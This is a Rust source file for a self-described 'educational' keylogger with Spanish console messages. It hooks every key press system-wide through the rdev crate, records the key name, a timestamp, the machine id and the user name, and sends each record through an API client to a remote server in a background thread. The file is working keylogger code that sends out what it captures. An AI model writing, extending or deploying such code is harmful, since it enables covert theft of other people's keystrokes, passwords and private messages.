// src/keylogger.rs
use rdev::{listen, Event, EventType};
use chrono::Local;
use crate::api::{ApiClient, KeyData};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};

pub struct Keylogger {
    api_client: Arc<ApiClient>,
    running: Arc<AtomicBool>,
}

impl Keylogger {
    pub fn new(api_client: Arc<ApiClient>) -> Self {
        Self {
            api_client,
            running: Arc::new(AtomicBool::new(true)),
        }
    }

    pub fn start(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("🟢 Keylogger educativo iniciado...");
        println!("📝 Presiona ESC para salir");

        let running = self.running.clone();
        let api_client = self.api_client.clone();

        let callback = move |event: Event| {
            if let EventType::KeyPress(key) = event.event_type {
                if key == rdev::Key::Escape {
                    println!("🛑 ESC presionado. Deteniendo...");
                    running.store(false, Ordering::SeqCst);
                    return;
                }

                let (machine_id, user) = ApiClient::get_machine_info();
                let key_name = match event.name {
                    Some(name) => name,
                    None => format!("{:?}", event.event_type),
                };
                let timestamp = Local::now().to_rfc3339();

                println!("[{}] Tecla: {}", timestamp, key_name);

                let key_data = KeyData {
                    timestamp,
                    key: key_name,
                    machine_id,
                    user,
                };

                let api = api_client.clone();
                std::thread::spawn(move || {
                    if let Err(e) = api.send_key(key_data) {
                        eprintln!("❌ Error enviando tecla: {}", e);
                    }
                });
            }
        };

        if let Err(error) = listen(callback) {
            eprintln!("❌ Error al escuchar eventos: {:?}", error);
        }

        Ok(())
    }

    //pub fn stop(&self) {
    //    self.running.store(false, Ordering::SeqCst);
    //    println!("🛑 Keylogger detenido");
    //}
}

pub fn iniciar_keylogger(api_client: Arc<ApiClient>) -> Result<(), Box<dyn std::error::Error>> {
    let keylogger = Keylogger::new(api_client);
    keylogger.start()
}
